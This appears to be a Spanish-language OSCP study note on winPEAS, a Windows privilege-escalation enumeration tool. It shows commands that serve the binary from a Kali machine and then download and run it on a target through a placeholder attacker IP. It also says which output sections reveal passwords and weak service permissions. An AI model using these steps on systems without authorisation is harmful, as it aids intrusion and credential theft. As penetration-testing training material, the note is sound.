---
tipo: tecnica
fase: privesc
so: windows
tags: [oscp, tecnica, privesc, windows]
fecha: 2026-10-08
---

# winPEAS

> [!abstract] Qué es y cuándo usarla
> Script de enumeración automatizada de Windows (parte de PEASS-ng). Vuelca en un único output coloreado casi toda la situational awareness (users/grupos, servicios, tareas, red, ficheros con posibles passwords, artefactos de PowerShell...). Complementa la enumeración manual — no la sustituye, puede fallar en detectar ciertas cosas.

## Requisitos previos
- Binario descargado en Kali: paquete `peass` (`/usr/share/peass/winpeas/winPEASx64.exe`).
- Servidor HTTP en Kali para transferirlo y ejecución de comandos en el objetivo.

## Pasos
```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```
```powershell
iwr -uri http://<IP_kali>/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```

Revisar especialmente: sección `Users` (grupos del user actual), `PS default transcripts history` (transcripts de PowerShell), servicios y tareas programadas con permisos débiles, y la sección de búsqueda de ficheros con posibles passwords en los homes.

> [!warning] Detección / problemas
> - Puede dar información incorrecta en detalles puntuales (ej. nombre de versión de SO).
> - No garantiza encontrar todos los ficheros sensibles sueltos (ej. notas en el Desktop) — seguir revisando a mano.
> - Los binarios de PEASS-ng suelen ser detectados por AV/EDR.

## Visto en
- Módulo: [[17 - Windows Privilege Escalation]]
- Relacionado: [[Service Binary Hijacking]] · [[Unquoted Service Paths]]
- Máquinas: [[]]
